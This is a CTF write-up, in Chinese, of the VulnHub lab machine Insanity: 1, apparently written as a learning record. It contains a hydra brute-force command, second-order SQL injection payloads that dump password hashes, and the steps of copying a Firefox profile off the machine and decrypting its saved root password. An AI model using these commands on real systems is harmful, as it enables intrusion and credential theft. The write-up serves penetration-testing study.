# Insanity: 1

2024-5-30 https://www.vulnhub.com/entry/insanity-1,536/

difficulty: Intermediate

## IP

192.168.5.30

## Scan

Open Port -> 21,22,80

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.5.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 85464106da830401b0e41f9b7e8b319f (RSA)
|   256 e49cb1f244f1f04bc38093a95d9698d3 (ECDSA)
|_  256 65cfb4afad8656efae8bbff2f0d9be10 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
|_http-title: Insanity - UK and European Servers
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
```

21 ftp 可以匿名登陆，登陆后，有一个 pub 文件夹，里面什么都没有，同时匿名用户不能上传文件。

直接看 80 web 服务，http://192.168.5.30/ 没发现其他连接，使用 gobuster 进行扫描：

```
gobuster -t 64 dir -u http://192.168.5.30/ -k -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -e

http://192.168.5.30/img                  (Status: 301) [Size: 232] [--> http://192.168.5.30/img/]
http://192.168.5.30/index.php            (Status: 200) [Size: 31]
http://192.168.5.30/data                 (Status: 301) [Size: 233] [--> http://192.168.5.30/data/]
http://192.168.5.30/css                  (Status: 301) [Size: 232] [--> http://192.168.5.30/css/]
http://192.168.5.30/news                 (Status: 301) [Size: 233] [--> http://192.168.5.30/news/]
http://192.168.5.30/index.html           (Status: 200) [Size: 22263]
http://192.168.5.30/js                   (Status: 301) [Size: 231] [--> http://192.168.5.30/js/]
http://192.168.5.30/webmail              (Status: 301) [Size: 236] [--> http://192.168.5.30/webmail/]
http://192.168.5.30/fonts                (Status: 301) [Size: 234] [--> http://192.168.5.30/fonts/]
http://192.168.5.30/monitoring           (Status: 301) [Size: 239] [--> http://192.168.5.30/monitoring/]
http://192.168.5.30/licence              (Status: 200) [Size: 57]
http://192.168.5.30/phpmyadmin           (Status: 301) [Size: 239] [--> http://192.168.5.30/phpmyadmin/]
http://192.168.5.30/.html                (Status: 403) [Size: 207]
http://192.168.5.30/phpinfo.php          (Status: 200) [Size: 85264]

```

http://192.168.5.30/news/ 说的是 monitoring 的内容，发现了一个邮箱 hello@insanityhosting.vm 和 1 个名字 Otis

http://192.168.5.30/data/VERSION 显示 1.14.0

http://192.168.5.30/webmail/src/login.php 发现一个 SquirrelMail version 1.4.22 服务。

http://192.168.5.30/phpmyadmin/ 发现 phpmyadmin 登陆页面，暂时没用户凭据，登陆不了。

http://192.168.5.30/monitoring/login.php 这里发现了一个登陆页面，先尝试用 otis 这个用户登陆，爆破下密码，看看能不能用常用密码撞库成功，最后发现密码 123456

```
hydra -t 20 -l otis -P ~/tools/dict/passwd_1050.txt 192.168.5.30 -f http-post-form "/monitoring/index.php:username=^USER^&password=^PASS^:F=login.php"

[80][http-post-form] host: 192.168.5.30   login: otis   password: 123456
```

登陆进 monitoring 系统，发现这个系统可以对主机进行是否启动监控，可自行添加 IP，这里可能存在 sql 注入或者是 RCE 命令执行，经过测试，没找到 sql 的回显。尝试下 ip 后接其他命令，看看能不能获得远程 RCE，尝试后不行。

看另外一个系统吧，webmail，用这个得到的用户凭据尝试是否能够登陆。

SquirrelMail version 1.4.22 存在 RCE 漏洞，但是需要一个可以登陆的用户凭据：

```
SquirrelMail < 1.4.22 - Remote Code Execution  | linux/remote/41910.sh

./41910.sh http://192.168.5.30/webmail/
```

尝试后，也还是不能利用。

在看看这个 webmail,发现前面 monitor 中的一些警告信息会发送到这里来，再次尝试前面添加的主机和 IP 时注入 sql 语句，可能就会在 webmail 中看到结果显示。

配置一个非 up 的 ip，告警信息就会显示在 webmail 中：

```
1234	192.168.5.4

1234 is down. Please check the report below for more information.

ID, Host, Date Time, Status
22,1234,"2024-05-30 11:30:01",0
```

host 这里看看有没有 sql 注入(先尝试的单引号必合，没有反应)：

```
test" union select '1','2','3','4' #	192.168.5.9

test" union select '1','2','3','4' # is down. Please check the report below for more
information.

ID, Host, Date Time, Status
1,2,3,4
```

发现 host 这里已经被替换，证明存在 sql 注入，这时就可以使用插入读表语句：

爆表：

```
test" union select group_concat(table_name),'2','3','4' from information_schema.tables where table_schema=database() #

"hosts,log,users",2,3,4
```

爆列：

```
test" union select group_concat(column_name),2,3,4 from information_schema.columns where table_name= 'users' and table_schema=database() #

"id,username,password,email",2,3,4
```

爆值：

```
test" union select group_concat(username + '<->' +password),2,3,4 from users #

"admin<->$2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cma,nicholas<->$2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe,otis<->$2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW",2,3,4
```

这个表是 monitor 中的用户表，没找到对应的明文密码，应该能猜到找不到明文密码，因为前面爆破登陆时都没找到密码。

看看能不能把 mysql 中的 user 表信息读取出来：

```
test" union select user, password ,3,4 from mysql.user #

root,*CDA244FF510B063DA17DFF84FF39BA0849F7920F,3,4
,,3,4
elliot,,3,4
```

发现有一个用户 elliot 的密码没有，root 的用户破解不出来。这里没思路了，经过查询相关资料，发现 mysql.user 表中还有一列 authentication_string 可以存密码，mysql 5.7 之后使用这个字段存。

```
test" union select user, password ,authentication_string,4 from mysql.user #

root,*CDA244FF510B063DA17DFF84FF39BA0849F7920F,,4
,,,4
elliot,,*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9,4
```

找到了 elliot 对应的明文密码 elliot123

估计是时候登陆 ssh 了，尝试登陆，能够成功登陆 elliot 用户。

进行系统枚举，sudo、suid、crontab 等内容都没发现可利用点，

这里没思路，经过查询资料，发现利用点在 mozilla 这里：

```
cd /home/elliot/.mozilla/firefox
tar -cvf esmhp32w.default-default.tar.gz esmhp32w.default-default
php -S 0:8888
```

这里用 php 创建 web 服务，端口不能连接，重新建立一个 ssh 的隧道进行连接：

```
ssh -N -L 8888:127.0.0.1:8888 elliot@192.168.5.30
```

将生成的 esmhp32w.default-default.tar.gz 下载到 kali，解压后，使用下面的工具进行存储的用户凭据解密：

```
wget http://127.0.0.1:8888/esmhp32w.default-default.tar.gz -O esmhp32w.default-default.tar.gz
tar -xf esmhp32w.default-default.tar.gz

git clone https://github.com/unode/firefox_decrypt.git

python firefox_decrypt.py esmhp32w.default-default/
2024-05-30 20:53:53,778 - WARNING - profile.ini not found in esmhp32w.default-default/
2024-05-30 20:53:53,778 - WARNING - Continuing and assuming 'esmhp32w.default-default/' is a profile location

Website:   https://localhost:10000
Username: 'root'
Password: 'S8Y389KJqWpJuSwFqFZHwfZ3GnegUa'
```

找到 root 的密码 S8Y389KJqWpJuSwFqFZHwfZ3GnegUa

尝试 su root 进行登陆，成功：

```
[root@insanityhosting ~]# cat flag.txt
    ____                       _ __
   /  _/___  _________ _____  (_) /___  __
   / // __ \/ ___/ __ `/ __ \/ / __/ / / /
 _/ // / / (__  ) /_/ / / / / / /_/ /_/ /
/___/_/ /_/____/\__,_/_/ /_/_/\__/\__, /
                                 /____/

Well done for completing Insanity. I want to know how difficult you found this - let me know on my blog here: https://security.caerdydd.wales/insanity-ctf/

Follow me on twitter @bootlesshacker

https://security.caerdydd.wales

Please let me know if you have any feedback about my CTF - getting feedback for my CTF keeps me interested in making them.

Thanks!
Bootlesshacker
```

这个靶场确实有一些之前没接触过的知识点，有些地方是找了网上的资料，才能继续下去。

最后，在看看 monitoring 中的 sql 注入是怎么形成的：

```sql
[root@insanityhosting monitoring]# cat settings/config.php
<?php
$databaseUsername = 'root';
$databasePassword = 'AesBeery8g9JLcWW';
$databaseServer = 'localhost';
$databaseName = 'monitoring';
$secureCookie = True;
?>

MariaDB [mysql]> select host,user,password,authentication_string from user;
+--------------------+--------+-------------------------------------------+-------------------------------------------+
| host               | user   | password                                  | authentication_string                     |
+--------------------+--------+-------------------------------------------+-------------------------------------------+
| localhost          | root   | *CDA244FF510B063DA17DFF84FF39BA0849F7920F |                                           |
| insanityhosting.vm | root   | *CDA244FF510B063DA17DFF84FF39BA0849F7920F |                                           |
| 127.0.0.1          | root   | *CDA244FF510B063DA17DFF84FF39BA0849F7920F |                                           |
| ::1                | root   | *CDA244FF510B063DA17DFF84FF39BA0849F7920F |                                           |
| localhost          |        |                                           |                                           |
| insanityhosting.vm |        |                                           |                                           |
| %                  | elliot |                                           | *5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9 |
+--------------------+--------+-------------------------------------------+-------------------------------------------+

MariaDB [monitoring]> select * from users;
+----+----------+--------------------------------------------------------------+-----------------------------+
| id | username | password                                                     | email                       |
+----+----------+--------------------------------------------------------------+-----------------------------+
|  1 | admin    | $2y$12$huPSQmbcMvgHDkWIMnk9t.1cLoBWue3dtHf9E5cKUNcfKTOOp8cma | admin@insanityhosting.vm    |
|  2 | nicholas | $2y$12$4R6JiYMbJ7NKnuQEoQW4ruIcuRJtDRukH.Tvx52RkUfx5eloIw7Qe | nicholas@insanityhosting.vm |
|  3 | otis     | $2y$12$./XCeHl0/TCPW5zN/E9w0ecUUKbDomwjQ0yZqGz5tgASgZg6SIHFW | otis@insanityhosting.vm     |
+----+----------+--------------------------------------------------------------+-----------------------------+

MariaDB [monitoring]> select * from log limit 1,2;
+----+-----------+---------------------+--------+
| id | name      | dateTime            | status |
+----+-----------+---------------------+--------+
| 1678 | test" union select user, password ,3,4 from mysql.user #                                          | 2024-05-30 13:56:04 |      0 |
| 1679 | test" union select user, password ,authentication_string,4 from mysql.user #                      | 2024-05-30 13:56:04 |      0 |
| 1680 | test" union union select group_concat(password),2,3,4 from users #                                | 2024-05-30 13:56:04 |      0 |
| 1681 | test" union union select group_concat(username + '->' + password),2,3,4 from users #              | 2024-05-30 13:56:04 |      0 |
| 1682 | test" union union select group_concat(username),2,3,4 from users #                                | 2024-05-30 13:56:04 |      0 |
| 1683 | test" union union select group_concat(username),group_concat(password),3,4 from users #           | 2024-05-30 13:56:04 |      0 |
+----+-----------+---------------------+--------+

MariaDB [monitoring]> select * from hosts;
+--------------------------------------------------------------------------------------------------------------------------------------------+-------------+--------+
| name                                                                                                                                       | ipAddress   | userID |
+--------------------------------------------------------------------------------------------------------------------------------------------+-------------+--------+
| test" union union select group_concat(username),group_concat(password),3,4 from users #                                                    | 192.168.3.1 |      3 |
+--------------------------------------------------------------------------------------------------------------------------------------------+-------------+--------+

```

为什么插入配置 host 时带有双引号没有报错，看源码中是使用的预编译,所以特殊分隔符都不起作用：

```php
cat index.php

$sqlString = "INSERT INTO hosts (name, ipAddress, userID) VALUES (?,?,?)";

$currentdb->constructQuery($sqlString)
    ->bind(1, $_POST["name"])
->bind(2, $_POST["ipAddress"])
->bind(3, $currentUser->userID)
->execute();

log 表中的数据不是执行sql注入之后的数据。
```

在看看是什么引起的 sql 注入执行的：

```php
cat cron.php

if ($status == 0) {
    $sqlString = "SELECT * FROM monitoring.log WHERE name = \"" . $result["name"] . "\"";   <--- 这里就是产生sql注入的关键点，没有使用预编译bind变量，导致sql注入
    $rows = $currentdb->constructQuery($sqlString)
        ->resultset();

    if (count($rows) > 0) {

        $output = fopen('php://temp/maxmemory:'. (5*1024*1024), 'r+');

        foreach($rows as $res) {
            fputcsv($output, $res);
        }

        rewind($output);

        $output = stream_get_contents($output);
        $output = "ID, Host, Date Time, Status\r\n" . $output;
        $data = $result["name"] . " is down. Please check the report below for more information.";
        mail($result["email"], "WARNING", $data . "\r\n\r\n" . $output);
    }
}

$result["name"] = test" union select user, password ,3,4 from mysql.user # 将此变量值带入后，就变成了下面的样子
SELECT * FROM monitoring.log WHERE name = "test" union select user, password ,3,4 from mysql.user #"
```

ip 处不能执行命令 RCE，因为在 ping 的 class 中使用了 escapeshellcmd 过滤了输入的参数，导致 ; | && 等分割字符全部被过滤。
